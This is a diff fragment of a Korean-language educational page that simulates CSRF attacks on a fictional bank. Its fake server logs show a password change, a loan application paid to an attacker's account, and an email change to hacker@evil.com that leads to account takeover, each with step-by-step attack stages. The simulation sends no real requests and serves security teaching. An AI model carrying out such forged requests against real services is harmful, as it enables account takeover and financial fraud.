+                    '<div><strong>1단계:</strong> 피해자가 은행에 로그인 (세션 쿠키 발급)</div>' +
+                    '<div><strong>2단계:</strong> 피해자가 피싱 사이트 접속</div>' +
+                    '<div><strong>3단계:</strong> "경품 받기" 버튼 클릭</div>' +
+                    '<div><strong>4단계:</strong> 숨겨진 폼이 은행 API로 POST 요청</div>' +
+                    '<div><strong>5단계:</strong> 브라우저가 자동으로 세션 쿠키 포함</div>' +
+                    '<div><strong>6단계:</strong> 은행 서버가 세션만 확인 (CSRF 토큰 없음)</div>' +
+                    '<div><strong>7단계:</strong> 이체 실행 완료</div>';
+                
+            } else if (scenario === 2) {
+                // 비밀번호 변경
+                addLog('[POST] https://xxbank.com/api/change-password', 'text-blue-400');
+                await sleep(300);
+                addLog('[PAYLOAD] newPassword=hacker123!@#', 'text-gray-400');
+                await sleep(300);
+                addLog('[VALIDATION] Session check: PASS ✓', 'text-green-400');
+                await sleep(300);
+                addLog('[VALIDATION] CSRF token check: SKIPPED ✗', 'text-red-400');
+                await sleep(500);
+                addLog('[DANGER] Password changed without verification!', 'text-red-500 font-bold');
+                await sleep(300);
+                addLog('[RESULT] New password: hacker123!@#', 'text-red-500 font-bold');
+                
+                document.getElementById('attackSuccess').classList.remove('hidden');
+                document.getElementById('attackDetails').innerHTML = 
+                    '<strong>✓ 비밀번호 변경 성공!</strong><br>' +
+                    '피해자의 비밀번호가 <code class="bg-black px-2 py-1">hacker123!@#</code>로 변경되었습니다.<br>' +
+                    '<span class="text-xs mt-2 block">해커는 이제 이 비밀번호로 로그인하여 계정을 완전히 장악할 수 있습니다.</span>';
+                
+                document.getElementById('attackStages').classList.remove('hidden');
+                document.getElementById('stagesContent').innerHTML = 
+                    '<div><strong>1단계:</strong> 피싱 사이트에서 악성 스크립트 실행</div>' +
+                    '<div><strong>2단계:</strong> 비밀번호 변경 API 호출</div>' +
+                    '<div><strong>3단계:</strong> 세션 쿠키로 본인 인증 통과</div>' +
+                    '<div><strong>4단계:</strong> CSRF 토큰 없이 비밀번호 변경</div>' +
+                    '<div><strong>5단계:</strong> 해커가 새 비밀번호로 로그인</div>' +
+                    '<div><strong>6단계:</strong> 계정 완전 장악</div>';
+                
+            } else if (scenario === 3) {
+                // 대출 신청
+                addLog('[POST] https://xxbank.com/api/loan/apply', 'text-blue-400');
+                await sleep(300);
+                addLog('[PAYLOAD] amount=50000000, period=60months', 'text-gray-400');
+                await sleep(300);
+                addLog('[PAYLOAD] depositAccount=999-888-777777', 'text-gray-400');
+                await sleep(300);
+                addLog('[VALIDATION] Session check: PASS ✓', 'text-green-400');
+                await sleep(300);
+                addLog('[VALIDATION] CSRF token check: SKIPPED ✗', 'text-red-400');
+                await sleep(500);
+                addLog('[DANGER] Loan application submitted!', 'text-red-500 font-bold');
+                await sleep(300);
+                addLog('[RESULT] ₩50,000,000 loan approved', 'text-red-500 font-bold');
+                
+                document.getElementById('attackSuccess').classList.remove('hidden');
+                document.getElementById('attackDetails').innerHTML = 
+                    '<strong>✓ 대출 신청 성공!</strong><br>' +
+                    '피해자 명의로 <strong class="text-xl">₩50,000,000</strong> (5천만원) 대출이 신청되었습니다.<br>' +
+                    '대출금은 해커 계좌(999-888-777777)로 입금됩니다.<br>' +
+                    '<span class="text-xs mt-2 block">피해자는 나중에 대출 상환 독촉을 받고서야 알게 됩니다.</span>';
+                
+                document.getElementById('attackStages').classList.remove('hidden');
+                document.getElementById('stagesContent').innerHTML = 
+                    '<div><strong>1단계:</strong> 피싱 사이트에서 대출 신청 폼 자동 제출</div>' +
+                    '<div><strong>2단계:</strong> iframe을 사용해 결과 숨김</div>' +
+                    '<div><strong>3단계:</strong> 피해자 세션으로 본인 인증</div>' +
+                    '<div><strong>4단계:</strong> 대출 승인 (CSRF 토큰 없음)</div>' +
+                    '<div><strong>5단계:</strong> 대출금이 해커 계좌로 입금</div>';
+                
+            } else if (scenario === 4) {
+                // 이메일 변경
+                addLog('[POST] https://xxbank.com/api/profile/email', 'text-blue-400');
+                await sleep(300);
+                addLog('[PAYLOAD] email=hacker@evil.com', 'text-gray-400');
+                await sleep(300);
+                addLog('[VALIDATION] Session check: PASS ✓', 'text-green-400');
+                await sleep(300);
+                addLog('[VALIDATION] CSRF token check: SKIPPED ✗', 'text-red-400');
+                await sleep(500);
+                addLog('[DANGER] Email changed to hacker@evil.com', 'text-red-500 font-bold');
+                await sleep(300);
+                addLog('[INFO] Attacker can now reset password via email', 'text-red-500 font-bold');
+                
+                document.getElementById('attackSuccess').classList.remove('hidden');
+                document.getElementById('attackDetails').innerHTML = 
+                    '<strong>✓ 이메일 변경 성공!</strong><br>' +
+                    '피해자의 이메일이 <code class="bg-black px-2 py-1">hacker@evil.com</code>로 변경되었습니다.<br>' +
+                    '<span class="text-xs mt-2 block">해커는 이제 "비밀번호 찾기"를 통해 재설정 링크를 받아 계정을 탈취할 수 있습니다.</span>';
+                
+                document.getElementById('attackStages').classList.remove('hidden');
+                document.getElementById('stagesContent').innerHTML = 
+                    '<div><strong>1단계:</strong> 이메일 변경 요청 전송</div>' +
+                    '<div><strong>2단계:</strong> CSRF 토큰 없이 이메일 변경</div>' +
+                    '<div><strong>3단계:</strong> 해커가 "비밀번호 찾기" 요청</div>' +
+                    '<div><strong>4단계:</strong> 재설정 링크가 해커 이메일로 전송</div>' +
+                    '<div><strong>5단계:</strong> 해커가 비밀번호 재설정</div>' +
+                    '<div><strong>6단계:</strong> 2차 인증도 해커 이메일로 전송됨</div>';
+            }
+            
+            badge.textContent = 'COMPROMISED';
+            badge.className = 'text-xs bg-red-500 text-white px-3 py-1 rounded code-font';
+            
+            document.getElementById('judgementBox').classList.remove('hidden');
+            document.getElementById('judgement').innerHTML = '<span class="text-red-400">취약</span>';
+            document.getElementById('evidence').textContent = 'CSRF 토큰 검증 없이 상태 변경 요청 실행 - 사용자 의도와 무관하게 악의적 작업 수행됨';
+            document.getElementById('damageBox').classList.remove('hidden');
+        }
+
+        function addLog(msg, colorClass) {
+            var div = document.createElement('div');
+            div.className = colorClass || 'text-gray-400';
+            div.textContent = '> ' + msg;
+            var container = document.getElementById('serverLog');
+            container.appendChild(div);
+            container.scrollTop = container.scrollHeight;
+        }
+
+        function sleep(ms) {
+            return new Promise(function(resolve) {
+                setTimeout(resolve, ms);
+            });
         }
     </script>
 </body>
